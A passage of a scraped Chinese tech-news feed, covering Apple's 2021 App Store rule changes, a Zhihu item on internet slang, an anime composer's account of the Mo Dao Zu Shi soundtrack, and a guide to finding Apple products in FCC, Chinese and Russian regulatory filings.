还将设立一项基金以协助美国小型开发者，尤其在世界持续遭受新冠疫情影响的背景下。符合资质的开发者须在 2015 年 6 月 4 日到 2021 年 4 月 26 日之间，在他们拥有账户的每一个自然年里，在美国商店发布的所有 App 获取的全部收入累计不超过 1 百万美元 —— 这包含 99% 的美国开发者。未来将披露关于此基金的细节信息。</li>\n</ul></blockquote>\n<p>其中，除了最后提及用于协助小型开发者的基金目前仅面向美国地区开发者提供之外，其余条款将在正式生效之后适用于全球开发者。</p>\n<p>可以看出，条款中关于 App 在 App Store 中销售的分成、搜索、推荐推广方面的内容，实际上与现有政策保持了一致：<a href=\"https://sspai.com/post/63686\" target=\"_blank\">App Store 小型企业计划</a> 继续生效，符合条件的 App 将享受 15% 的优惠分成比例；App Store 搜索功能将在至少 3 年之内继续保持目前的搜索广告机制、权重计算与排序规则等等；已有价格点数方案也没有太大变化，只有数量限制从 100 个增加至 500 个。</p>\n<p>值得关注的是，App Store 更新生效之后，开发者将能在用户允许的前提下，直接在应用内获取用户的联系方式，再通过这些方式在 App 与 App Store 之外向用户告知或推荐其它购买渠道，这些外部渠道产生的购买行为无需向 Apple 支付佣金。</p>\n<p>不难发现，此项举措针对的是现有 <a href=\"https://developer.apple.com/cn/app-store/review/guidelines/\" target=\"_blank\">App Store 审核指南</a> 3.1.3 条做出的调整，原有条款明确规定：</p>\n<blockquote><p>其他购买方式：以下 app 可以使用 App 内购买项目以外的购买方式。此部分中的 app 不得在 app 内鼓励用户使用 app 内购买项目以外的购买方式。开发者不得使用从 app 内获得的信息将个人用户定向到 app 之外的位置，以使用 app 内购买项目之外的购买方式 (例如，个人用户在 app 内注册帐户后，向这位用户发送介绍其他购买方式的电子邮件)。开发者可以在 app 之外向其用户群发送宣传材料，以介绍 app 内购买项目以外的购买方式。</p></blockquote>\n<p>因此，更新生效之后， 开发者在 App 销售方面会有更多灵活性与选择权，为 iOS 应用开发独立授权系统也许将不再是开发者们需要担心的审核难题。需要注意的是，此项举措的变化主要是允许开发者在不侵犯用户隐私的前提下与其建立外部联系与沟通，在 App 内提供支付宝、微信支付等付费方式依然是被禁止的行为。</p>\n<p>不难理解，由于 App Store 销售机制与方案的多样性和复杂性，一套 App Store 之外的收费系统需要开发者考虑 App 的订阅管理、退订和退款功能等等，在 App 内提供其它支付方式，不仅可能会产生非常大的开发成本，还很有可能损害用户的相关权益；而 App 内购买功能，依然是开发者最为省心和省力的选择，也能合理有效地保障买卖双发的合法权益。</p>\n<p>新闻稿发布之后，我们也与国内多位知名开发者针对此次 App Store 宣布的更新进行了简单交流，了解他们对于这些条款的看法。</p>\n<p>对于 App Store 近年包括此次更新在内推出的一系列举措，大部分开发者都给出了肯定，认为这些方案不仅能够实际帮助开发者获得更高的收益、降低开发成本，也能看出 Apple 对于开发者与用户在变得更加开放与透明。</p>\n<p>不过对于此次更新而言，虽然在条款方面确实是对原有内容进行了调整，但是也需要注意，开发者通过应用获取用户联系信息进行不规范推广的行为，已经普遍存在于各种类型的 App 之中，加上邮件、短信等联系方式难以监管，原有条款本身似乎就是「防君子不防小人」的一项约定；部分开发者表示，希望能在新的条款通过审核正式实施之后，再来看看执行方面具体能以怎样的形式和方式进行，以及是否能够从中受益。</p>\n<p>除了比较受关注的触达客户条款，也有开发者注意到了 App Store 在应用审核方面的相关更新，他们表示 App Store 在审核透明度方面的进一步加强，无疑是为众多开发者准备的一剂强心剂，不仅有可能进一步避免审核出错的情况，也为开发者规范 App 行为提供了更好的指导。当然，也有开发者提出了想法与建议：提高接口服务的稳定性、进一步规范退款流程的规范性，都是不少开发者希望能在未来 App Store 中看到的更新，也希望能够获得与 Apple 开发和审核部门交流的更多机会。</p>\n<p>本次 App Store 更新是 Apple 针对 2019 年由美国开发者提起的一起集体诉讼案的和解协议，目前已经获得相关开发者方面的一致认可，具体条款需要等待法官审核通过之后才会正式执行。</p>\n<p>虽然从目前国内的不少开发者反馈来看，本次更新没有让他们看到实际方面的太大变化，但是 Apple 近年与开发者关系的进一步建立、针对开发者权益推出的一系列举措，也让他们感受到了 Apple 在此方面做出的努力与诚意，并且期待看到 App Store 未来的更多相关变化。对于用户而言，Apple 与开发者之间关系的缓和与发展，无疑也是一件好事，在某种程度上似乎也会成为「三赢」的局面。</p>\n<p>就在此项更新宣布之后一周，Apple 又于 9 月 1 日发布新闻稿 <a href=\"https://www.apple.com.cn/newsroom/2021/09/japan-fair-trade-commission-closes-app-store-investigation/\" target=\"_blank\">宣布</a>，从 2022 年初开始，「阅读器类」App 将能够引导用户直接在应用内前往服务网站进行帐号注册、信息查看与管理、付费购买等操作，再次增加了应用的灵活性。</p>\n<figure class=\"ss-imgRows\" figcaption=\"用户目前几乎无法在 App 内对帐号进行操作，也无法直接跳转至服务网站。\"><img src=\"https://cdn.sspai.com/2021/09/02/28f4e7fd40cf35ec2cfe65e33ad3e460.PNG\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/09/02/3cee932d4c6077e13f319549f02c0afd.png\" alt=\"\"></figure><p>我们也在与几位开发者简单讨论之后，获得了对于此举的积极评价，也更让人好奇，Epic 诉讼案之后，App Store 是否会再迎来让开发者和用户喜闻乐见的新变化。</p>\n<p>你对于此次 App Store 宣布更新有何看法，欢迎各抒己见进行讨论。</p>\n<p>&gt; 下载 <a href=\"https://sspai.com/page/client\" target=\"_blank\">少数派 2.0 客户端</a>、关注 <a href=\"https://sspai.com/s/J71e\" target=\"_blank\">少数派公众号</a>，解锁全新阅读体验 📰</p>\n<p>&gt; 实用、好用的 <a href=\"https://sspai.com/mall\" target=\"_blank\">正版软件</a>，少数派为你呈现 🚀</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68571"},{"title":"媒体批「yyds」「绝绝子」等网络用语，称人们离开「梗」就不会说话了，网络用语真的会影响表达能力吗？","date":"2021-09-02 07:47:44","description":"\n<p></p>\n<a href=\"https://www.zhihu.com/video/1416780905449480193\">年轻人聊天为什么动不动就yyds？</a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xin-jing-bao-95?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">新京报</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/484057801/answer/2098911638?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2519 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/435750149?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何看待中国青年报批「做题家」？</a><br><a href=\"http://www.zhihu.com/question/266122357?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">图片上的文字是啥意思？</a><br>\n","link":"http://www.zhihu.com/question/484057801/answer/2098911638?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"《魔道祖师》动画配乐数量达 100 首，有哪些令你记忆深刻？","date":"2021-09-02 06:43:34","description":"\n<p>配乐是影视动画作品制作中重要的组成部分，它可以从听觉上辅助我们观影过程中的情绪感知，起到烘托剧情的作用。《魔道祖师》动画系列作品的配乐部分，初略统计了一下，大约有400首以上、超过500分钟的配乐时长。在整个动画配乐创作上，我们所追求的，是对传统乐器音色的还原保留，对不同剧情的针对性定制烘托，以及对我国各种传统乐曲的融合尝试。更何况作品中的主角，本身就多以乐器作为武器，这对我们在影片配乐上的制作要求提出了更多的、更加精益求精的需求。我们片中一段配乐往往要通过多次反复创作迭代，不断尝试出最佳的状态效果。</p>\n<p>举个例子，我们在创作第一集片尾中主角蓝忘机出场桥段的音乐时，最开始的思路着重于，用古风配乐烘托出这个角色仙气飘飘的特点，让他有一种天然自带BGM的感觉。后来在和画面配合起来后，我觉得还不够，在和音乐总监反复磨合之后，我们发现了一种更加优化的配乐方式，我们尝试使用了角色蓝忘机本身的武器【古琴】这一乐器，创作出一段以古琴作为核心乐器的配乐，古琴音域宽广、音色深沉、余音悠远的特点加入到音乐之中，让雅正端方的“含光君”这个角色一下就立体丰满了。</p>\n<p>在《魔道祖师》动画整体配乐的创作过程中，我和音乐总监确实花了不少心思，下面就简单聊聊几个我觉得还比较有意思的点，和大家分享分享：</p>\n<p><b>1、中国传统乐器声音实录</b></p>\n<p>其实在这部作品里，我们花了大量的工作用在传统乐器声音实录这一部分。我们所有的琴、笛、琵琶、扬琴、瑟等等传统乐器，基本都是通过实录的方式来完成，一路下来，每一集的音乐制作量确实不小。拿28集中魏无羡、蓝忘机和蓝曦臣三个人一起压制赤锋尊这段来说，分别用上了三位角色的“御用乐器”——笛子、古琴和箫，整段以MIDI音乐打底，采用中国传统乐器实录的方式进行混制，乐器声音实录出来的音频效果，既能呼应角色本身的常用武器(乐器)，又能更好营造出清冽悠远的古风意境。出来的效果我还比较满意，和我们的画面很融。其实像这样运用传统乐器特色来烘托剧情场景的地方还有不少，比如描述魏无羡和江澄兄弟之情时，用笛子演奏主题歌《醉梦前尘》的旋律变奏；在蓝曦臣为魏婴讲述父母过往时，使用笛子、二胡来表现曦臣忘机父母故事的曲折和悲伤；在温宁在温情墓前的那场戏，使用了笛子表现温室射日之征后的落魄和人丁凋零；等等。</p>\n<p><b>2、契合剧情 表达效果最大化</b></p>\n<p>把握好配乐使用的分寸，是我对作品配乐的核心要求。不会喧宾夺主，又能为影片的整体化服务，在带入观众情绪的同时，又要有足够的停顿和留白。我觉得配乐从技术环节的层面上讲，更多的不是技而是术，简单的说，也就是更多在乎的是方法而不是技巧。在音乐老师进行配乐创作之前，我都要求他们必须对整体剧情、人物性格、画面表达有足够的了解，能够配合剧情的配乐才是好配乐。因此这一部分，是我们《魔道祖师》系列动画在音乐追求的核心方向。</p>\n<p>为此，我们采用了电影配乐的制作标准——根据具体情节，创作出相适应的音乐。</p>\n<p>比如我们在“前尘篇”中，夷陵老祖魏无羡首次出场吹奏“鬼笛”陈情的那场戏，我们要求实录的民乐老师在带旋律的同时，技法上强化吹笛颤音的吐音；而魏无羡被献舍归来后，在第二集的剧情中要用随手削出的竹笛吹出曲子，那它就一定要区别于前面那场“陈情”吹出的动听的效果，说白了也就是要技法娴熟、但是不那么好听。最后，我们用一把已经坏了的笛子，把它临时修复一下，乐器本来的音调还不是那么的准确，但是吹奏的技法又非常娴熟，最后实录出来的效果就很贴剧情需要的那个状态了。</p>\n<p>再比如“完结篇”中，我们在设计晓星尘开棺这段配乐时，想要传达给观众的感受主要有两个，一是“好美”，二是“好可惜”。所以我们在配器上，选用了竖琴和弦乐用来铺底，单簧管演奏旋律。竖琴的听感是晶莹剔透的，给人一种冰清玉洁的感受；而在表达舒缓柔和的曲风时，单簧管与弦乐的融合度是非常好的，适合用来烘托晓星尘的角色形象，实现“好美”这部分的诉求。而“好可惜”，更多的则是运用音乐性来讲述，在旋律和和声上实现。比如，我们在小调旋律中加入了变化音#2 #5，完成了配乐从平缓到悲伤的情绪转折，为影片带入后续剧情提供足够的烘托。</p>\n<p>配乐不等同于歌曲创作，理想的配乐应该是观众在记住故事情节的下一步才会注意到音乐，每当音乐响起，画面又能在观众的脑海中重新浮现出来，这就达到了配乐的核心要求。</p>\n<p><b>3、发掘传统音乐的更多面</b></p>\n<p>在《魔道祖师》动画三季配乐制作中，我们也一直在努力挖掘和尝试很多具有新鲜感的配乐。比如“完结篇”中薛洋假扮晓星尘出场时的BGM中，我们加入了中国传统打击乐器，以一个类似于戏曲的感觉，为剧情中薛洋假扮晓星尘提供暗示。我们以传统戏曲为灵感，提取音乐元素融入到薛洋假扮晓星尘出场时的bgm中，比如打击乐镲和锣。作为打击乐，它们音色识别性极强。在演奏时，通常用在节奏的最高点，加强戏剧效果。戏曲是我们的传统艺术，现今很少有人去专门去欣赏和品味，我们希望以类似的融合为契机，能让大家关注到更多的传统音乐。</p>\n<p>整个《魔道祖师》动画系列的配乐，每位主角都有专属的音乐元素增强角色的识别，每段剧情也有相应的配乐旋律烘托整体的氛围。目前完结篇正在更新中，欢迎大家在观看的同时，有时间可以品味一下融合在整体画面中的配乐，希望能带给大家更加立体的观感体验。也再次感谢大家对我们的作品的喜爱与关注。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/xiong-ge-34-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">敻牁</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/483985096/answer/2098783281?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">10 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/404241911?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在我应该怎么看《魔道祖师》极其衍生作品?</a><br><a href=\"http://www.zhihu.com/question/402175455?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">在哪看魔道祖师啊?</a><br>\n","link":"http://www.zhihu.com/question/483985096/answer/2098783281?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"监管信息是怎样「剧透」Apple 产品的","date":"2021-09-02 06:35:22","description":"\n<blockquote><p>近日，疑似 Apple 新品 [·] 的信息现身 [·] 国官方数据库中，据此 [ 判断 [·] 将在近期发布 | 坐实了此前的传闻 ]。</p></blockquote>\n<p>如果你经常关注 Apple 产品的资讯，一定对这样的报道句式不陌生。</p>\n<p>但在为新品信息兴奋之余，你是否也曾对这种报道的可信度产生过疑问——「官方数据库」是怎么来的、从哪访问、具体披露了什么？Apple 为什么愿意提前交出这些信息？「据此判断」的逻辑又何在？</p>\n<p>可惜的是，在拾人牙慧之风盛行的科技新闻领域，大多数报道仅仅求「快」，对于上述问题大多付之阙如。一则资讯经过几轮转述，往往已经面目全非，遑论指出信源依据和推断逻辑了。任何对质量有要求的读者，都不会满足于这种程度的细节。</p>\n<p>为此，本文将以媒体的实际报道为例，解释 Apple 资讯中常见监管披露信息的背景、内容和价值，并说明自行查找各地信息的方式。在 Apple 年度「新品季」行将到来、各路小道消息盛嚣尘上之际，希望为读者甄别报道靠谱程度、作出自主判断提供一些参考。</p>\n<h2><strong>监管披露信息概述</strong></h2>\n<p>在具体介绍各地监管披露信息源之前，有必要先从整体上解释两个基础问题：监管披露<strong>为什么</strong>能透露新品信息，能透露<strong>什么样</strong>的信息？</p>\n<p>作为电子设备，iPhone、iPad 和 Mac 等 Apple 产品涉及无线通讯、充放电等功能，具有蜂窝网络、WiFi、蓝牙模块和电池等部件。对此，出于保障用户安全、维护无线电频谱资源使用有序等目的，大多数司法辖区都从<strong>电气安全性能、电磁兼容（EMC）、无线电射频</strong>等方面提出了监管要求。最常见的监管方式，就是要求产品根据指定标准通过测试、认证，并将结果提交监管部门申请备案或批准。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/594c5f42bdb71d2a8caa01cb2e1a8598\" alt=\"早年 iPhone 背面的监管标识，后来法规普遍允许改为电子标注（来源：Apple）\"><figcaption>早年 iPhone 背面的监管标识，后来法规普遍允许改为电子标注（来源：Apple）</figcaption></figure><p>为了最大化监管效果，上述流程一般是<strong>前置</strong>的，即必须在产品出厂、上市或进口前完成。因此，即使如 Apple 那般看重保密、对新品信息三缄其口，在这时也必须有所让步，提前完成认证和申报。又因为这些监管流程普遍受到行政公开原则的约束，监管部门一般都会公示申报结果；这就为公众提前「窥见」 Apple 的产品信息提供了窗口。</p>\n<p>当然，道高一尺，果高一丈。在确保「遵纪守法」的同时，Apple 绝不会愿意提供超过法规要求最低限度的细节。例如，监管申报一般要求提供产品的型号，但「型号」是一个模糊的概念；以一台国行、蓝色、128GB 容量的 iPhone 12 Pro 为例，随手就可以举出四五种可以称之为「型号」的信息：</p>\n<figure class=\"table\"><table>\n<thead><tr>\n<th><strong>识别符 Identifier</strong></th>\n<th><strong>值 Value</strong></th>\n</tr></thead>\n<tbody>\n<tr>\n<td>型号名称 Model name</td>\n<td>iPhone 12 Pro, Pacific Blue, 128GB</td>\n</tr>\n<tr>\n<td>型号数字 Model number</td>\n<td>A2408</td>\n</tr>\n<tr>\n<td>部件号 Part number</td>\n<td>MGLDCCCH/A</td>\n</tr>\n<tr>\n<td>主板编号 Board ID</td>\n<td>D53pAP</td>\n</tr>\n<tr>\n<td>机型标识符 Model Identifier</td>\n<td>iPhone13,3</td>\n</tr>\n</tbody>\n</table></figure><p>这些名称各自的含义、用途和编制规律超出了本文的讨论范围。这里，只需知道<strong> Apple 提交的一般只是型号数字（model number）</strong>，即以 A（或早年的 M）开头、后加四位数字（偶有字母）组成的编号。原因在于，与其他称呼相比，型号数字既不会透露产品的实际名称或「辈份」，又不像部件号那样过于具体（不同颜色和配置的同款机型部件号不同，但型号数字相同），对于监管申报而言可谓是透露得「恰到好处」。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/8289c523fdd7dc300deee1e20e0b2c60\" alt=\" Apple 产品标签上展示的多种「型号」（来源：Apple）\"><figcaption>Apple 产品标签上展示的多种「型号」（来源：Apple）</figcaption></figure><p>除此之外，如下文将会介绍的，Apple 还会充分利用临时保密期、多个产品共用一个许可、事后修订申报信息等合法机制，尽量减少新品在监管信息中的痕迹。这进一步加大了推测的难度。</p>\n<p>尽管如此，监管披露信息仍然提供了很多可琢磨的空间。例如，尽管我们不知道型号数字的编制规律，但经验上看，同类产品的型号数字往往比较接近，且随迭代而逐渐增大。因此，通过与历史上的型号数字比对，即可大致推测新型号对应的产品。此外，正所谓「孤证不立」，监管披露本身或许不足以透露足够的新品信息，但可以彼此之间、或与供应链等渠道传来的信息相互印证、补充，从而更充分地揭晓产品面貌。</p>\n<h2><strong>常见监管披露信息举例及解读</strong></h2>\n<h3><strong>美国</strong></h3>\n<blockquote>\n<p>Apple传闻中的 PowerBeats 4 获得 FCC 批准。（<a href=\"https://www.macrumors.com/2020/02/27/powerbeats4-fcc/\">MacRumors，2020 年 2 月 27 日报道</a>）</p>\n<p>据 FCC 备案文件，iPhone 12 系列型号或支持对未来 Apple 配件反向充电。（<a href=\"https://www.macrumors.com/2020/10/27/iphone-12-wirelessly-charge-accessories-fcc/\">MacRumors，2020 年 10 月 27 日报道</a>）</p>\n</blockquote>\n<p>作为 Apple 母国的监管部门，联邦通讯委员会（Federal Communications Commission，FCC）的披露信息自然是需要优先关注的渠道。</p>\n<p>根据 FCC 的规则（<a href=\"https://www.law.cornell.edu/cfr/text/47/15.201\">47 CFR § 15.201</a>），<strong>射频设备</strong>（radiofrequency device，法律定义见 <a href=\"https://www.law.cornell.edu/cfr/text/47/2.801\">47 CFR § 2.801</a>）必须经批准（equipment authorization）方可在美国上市销售。粗略地说，只需要能发射无线电信号就算「射频设备」，因此大到 iMac、MacBook，小到 AirPods、Beats 耳机这类音频设备，以及 AirTags、MagSafe 电池这些配件，都需要按照<a href=\"https://apps.fcc.gov/oetcf/eas/reports/EquipmentRulesList.cfm\">具体类别</a>向 FCC 申请批准。</p>\n<p>不过，仅从 FCC 的公示信息推测 Apple 新品是比较困难的。根据 FCC 规则（<a href=\"https://www.law.cornell.edu/cfr/text/47/0.457\">47 CFR § 0.457</a>）和<a href=\"https://apps.fcc.gov/oetcf/kdb/forms/FTSSearchResultPage.cfm?switch=P&amp;id=41731\">相关公文</a>，申请人可以在提交备案时要求将部分材料临时或永久保密。 Apple 当然不会放过这样的好事，申报时一般总会要求对电路图、天线信息、软件安全描述等材料永久保密，而对设备照片、使用手册等材料临时保密直到上市。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/e8fe027de7aac651f19a15f3199bbb28\" alt=\"iPhone 12 Pro 的保密申请\"><figcaption>iPhone 12 Pro 的保密申请</figcaption></figure><p>但由于 Apple 并不能百发百中地掐准保密时间，而且 FCC 披露细节众多，从中总能多少挖出些信息。例如，在上述第一则报道中，媒体从 iPhone 12 发布后解密的 <a href=\"https://fccid.io/BCG-E3550A/RF-Exposure-Info/SAR-Simulation-Report-v2-4951514\">FCC 披露文件</a>得知该机型「支持以 360 kHz 向充电配件无线输电」，只是其所指为何当时尚不清楚；今年 MagSafe 便携电池上市后，印证了 iPhone 在连接电源的情况下确实可以<a href=\"https://support.%20apple.com/en-us/HT212174\">反向为其充电</a>。在第二则报道中，FCC 的信息则提前一个月确认了 Powerbeats 4 耳机的存在及其外观、参数等。</p>\n<p>要查询 FCC 披露信息，最权威的途径是通过 FCC 官方数据库的 <a href=\"https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm\">「设备批准搜索」</a>（Equipment Authorization Search）页面。以搜索 Apple 的近期申报为例，在「申请人名称」（Applicant Name）中输入 Apple Inc（或者在「被许可人编码 Grantee Code」中输入 Apple 的固定代号 BCG），然后在「日期范围」（Date Range）输入一个较近的起止日期范围，点击页面底部的「Start Search」即可看到结果。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/a53ddaf63b54270a5f30c9efc1e525c9\" alt=\"\"></figure><p>例如，下图中的搜索内容是 2021 年 6—8 月间 Apple 的备案信息：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/7b27b4475d3708a157d523d98f8e9653\" alt=\"\"></figure><p>结果页中，点击相应条目左侧的「Detail」字样即可查阅该产品所有已披露的备案文件。</p>\n<p>对于 Apple 产品而言，信息量比较丰富的文件类型包括：外部照片（external photos，相当于设备的「证件照」），内部照片（internal photos，相当于政府版的「拆解图」），测试配置照片（test setup photos，展示设备是在怎样的环境下、连接什么外部仪器接受射频测试的），和使用手册（user manual）等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/d733044cd6b8985cb684fb6f7e135206\" alt=\"FCC 披露的 iPhone 12 Pro 外部照片\"><figcaption>FCC 披露的 iPhone 12 Pro 外部照片</figcaption></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/d0ffc58bef04750fcad667f647e52452\" alt=\"FCC 披露的 iPhone 12 Pro 内部照片\"><figcaption>FCC 披露的 iPhone 12 Pro 内部照片</figcaption></figure><p>不难看出，尽管 FCC 官网最为权威，但其官网设计似乎还停留在上个世纪，外观简陋且操作繁琐。因此，很多媒体会使用第三方网站 <a href=\"https://fccid.io/\">FCCID.io</a> 作为替代。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/593378c7ad1969569f779966897c1da7\" alt=\"FCCID.io\"></figure><p>与官网相同，FCCID.io 同样可以用申请人名称、批准文号等条件检索，但用起来简洁流畅得多。从每个申请人的汇总页面，还能看到倒序排列的所有历史申请，并提供 RSS 订阅链接；这对于需要跟踪申报信息的从业者是非常方便的。</p>\n<h3><strong>中国</strong></h3>\n<blockquote>\n<p><strong>中国监管备案信息</strong>披露 Apple 新款 49.9 瓦时电池，或为升级版 MacBook Air 准备。（<a href=\"https://9to5mac.com/2020/07/28/macbook-air-battery-filings/\">9to5Mac，2020 年 7 月 28 日报道</a>）</p>\n<p>2018 新款 iPad 型号现身<strong>工信部认证</strong>信息，或为 iPad Pro 2018。（<a href=\"https://www.mysmartprice.com/gear/%20Apple-ipad-pro-2018/\">MySmartPrice，2018 年 10 月 11 日报道</a>）</p>\n</blockquote>\n<p>中国不仅是 Apple 产品生产制造的集中地，也是新品传闻的重要来源；很多掌握了供应链情报资源的人士已经成为国内外媒体争相引用的<a href=\"https://%20appletrack.com/leaderboard/\">「权威」信源</a>。</p>\n<p>相比之下，来自中国监管部门的信息则较少在 Apple 新品预测中「立功」。这一方面是因为很多产品在国内并非首发，备案也存在延迟（请回想一下那句经典的「此产品的供应需等待相关机构批准，在收到核准之前还不能发售」）；另一方面，国内监管信息的披露并不详尽，进一步限制了从中捕风捉影的空间。</p>\n<p>如上所述，Apple 产品主要涉及电气安全、电磁兼容和无线电射频方面的监管。在国内，前两者主要由国家市场监督管理总局（SAMR）通过<strong>强制性产品认证</strong>（即「CCC 认证」，China Compulsory Certification）管理，后者主要由工业和信息化部（MIIT）通过<strong>型号核准</strong>管理。</p>\n<h4><strong>强制性和自愿性产品认证</strong></h4>\n<p>根据 2009 年颁布的<a href=\"http://www.gov.cn/flfg/2009-07/21/content_1369826.htm\">《强制性产品认证管理规定》</a>，列入《强制性产品认证目录》的产品必须经过认证并标注认证标志后，方可出厂、销售、进口或者在其他经营活动中使用。现行有效的目录及其界定解读可从<a href=\"http://www.cnca.gov.cn/zl/qzxcprz/mlmsyjd/\">国家认证认可监督管理委员会网站</a>获取，Apple 绝大多数硬件产品及附件都在目录范围内。</p>\n<p>需要注意的是，<strong>CCC 证书和 Apple 产品并不一定是「一对一」的关系</strong>。</p>\n<p>一方面，Apple 会委托多家生产商生产同一产品，导致「多对一」。例如，MacBook Air（A2337）就有达功（上海）电脑有限公司和鸿富锦精密电子（成都）有限公司两家制造商，由它们分别申请了 CCC 证书。</p>\n<p>另一方面，根据管理规定，「型号变更，但不涉及安全性能和电磁兼容内部结构变化的」，可以沿用既有证书，导致「一对多」。例如，Apple 似乎并未为 2021 年的 12.9 寸 iPad Pro 重新申请 CCC 证书，而是通过变更 2016 年为初代 12.9 寸 iPad Pro 申请的证书履行了认证义务。</p>\n<p>CCC 认证的情况可以在<a href=\"http://webdata.cqccms.com.cn/webdata/query/CCCCerti.do\">中国质量认证中心</a> 查询。将关键字类型选为「申请人」，然后搜索「美国苹果公司」或英文名「 Apple Inc.」即可。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/a457a3818f5bf150d1002859edab0b7c\" alt=\"\"></figure><p>除了 CCC 认证之外，中国质量认证中心还有一项<strong>自愿性产品认证（CQC）</strong>业务。尽管属于自愿认证，但实践中厂商出于招投标门槛、采购方要求或提高竞争力等考虑，仍然有动力主动申请。不仅如此，由于不是 Apple 自己申请的整机认证，保密程度相对较低，CQC 认证反而在小道消息中存在感更高。</p>\n<p>上面的第一则报道就是一个典型例子。2020 年 7 月中旬，CQC 数据库中出现了一则型号为 A2389、容量为 49.9 瓦时的锂电池认证信息，制造商为 Apple 的电池供应商之一新普科技（Simplo Technology）；这一容量与此前的 MacBook Air 一致，因此人们据此推断该型号电池是为当时传闻中的 M1 MacBook Air 准备的。事后的<a href=\"https://www.ifixit.com/News/46884/m1-macbook-teardowns-something-old-something-new\">拆解</a>也印证了这个推测。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/182e1ec1285e719ad25cb1c1a74c4dfa\" alt=\"\"></figure><p>而随着 14 寸和 16 寸 MacBook Pro 的传闻四起，人们再次从 CQC 数据库中找出了<a href=\"https://www.macrumors.com/2021/06/03/16-inch-macbook-pro-regulatory-filing/\">蛛丝马迹</a>：2021 年 6 月上旬，型号为 A2527、A2519 的两种电池通过认证，容量分别与现有的 16 寸和 13 寸 MacBook Pro 相仿或略大，生产商则同样是 Apple 长期的电池供应商欣旺达电子（Sunwoda Electronic）和惠州市德赛电池（Huizhou Desay Battery）。准确与否，不妨拭目以待。</p>\n<p>CQC 认证信息的查询入口同样位于<a href=\"http://webdata.cqccms.com.cn/webdata/query/ZYCerti.do\">中国质量认证中心网站</a>，操作方法也与 CCC 认证类似，在此不赘。</p>\n<h4><strong>无线电型号核准</strong></h4>\n<p>除了产品认证，大多数 Apple 产品还因为具有通讯功能，受到中国<a href=\"http://www.gov.cn/zhengce/content/2016-11/25/content_5137687.htm\">《无线电管理条例》</a>的约束。根据该条例，除微功率短距离无线电发射设备外，生产或者进口在国内销售、使用的其他无线电发射设备，应当向国家无线电管理机构申请<strong>型号核准</strong>（第 44 条）。由于上述「无线电管理」职能实际由国家无线电监测中心（又称国家无线电频谱管理中心、SRRC）承担，属于工信部直属事业单位；因此，型号核准在英语报道中常被称为「CMMIT Certification」。</p>\n<p>在上面第二个例子中，媒体在工信部公示信息中发现了 Apple 申请的三个新型号设备，结合当时传闻和与其他地区监管信息的比对，判断其中两款很可能是 2018 版大小两种尺寸的 iPad Pro；事后证明这种推测是正确的。至于第三个型号（A1993），媒体在当时推测这是第二代 Apple Pencil，但事实表明那其实是 Mac mini 2018；这也从侧面说明仅靠型号数字并不保证做出准确的判断。</p>\n<p>要查询型号核准信息，可以到工信部政务服务平台的<a href=\"https://ythzxfw.miit.gov.cn/resultQuery\">办事结果查询板块</a>，在「业务分类」中选择「行政许可」&gt;「无线电和卫星通信」，然后通过右上角搜索框搜索申请单位名称「美国 Apple Inc.」（出于无法参透的原因，一个空格都不能差），即可看到 Apple 申请核准的设备信息。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/30/article/bd5d7aeacccd38756dc7078ccb0173dd\" alt=\"\"></figure><h3><strong>俄罗斯</strong></h3>\n<blockquote>\n<p>Apple 在欧亚经济联盟注册若干新款 Mac 和 iPad，或表明产品更新近在眼前。（<a 